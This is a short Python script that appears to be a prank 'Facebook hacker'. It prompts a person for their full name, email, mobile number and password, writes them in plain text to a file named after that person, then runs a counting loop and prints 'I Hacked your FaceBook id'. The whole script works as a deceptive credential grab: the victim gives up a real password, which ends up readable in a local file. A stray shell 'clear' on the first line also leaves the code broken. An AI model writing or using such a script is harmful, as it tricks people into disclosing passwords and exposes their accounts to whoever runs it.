clear
while True:
    N = input("\n\n\n\n\nEnter your full name :")
    E = input("Enter your email address :")
    M = input("Enter your mobile number :")
    P = input("Enter your password :")

    file1 = '[1]~~~Full name :'+N
    file2 = '[2]~~~Email address : '+ E
    file3 = '[3]~~~Mobile number :'+M
    file4 = '[4]~~~Password :'+P

    Files = file1+'\n\n'+file2+'\n\n'+file3+'\n\n'+file4+'\n\n'

    with open(N+".txt","w")as f:
         f.write(Files)

    Ncount = 1
    while Ncount < 18278912678:
          print (Ncount)
          Ncount = Ncount + 100000
          if Ncount > 18278912678:
             print("          ♠ I Hacked your FaceBook id ♠")
          else:
            print("            :Your FaceBook id is Hacked ")     
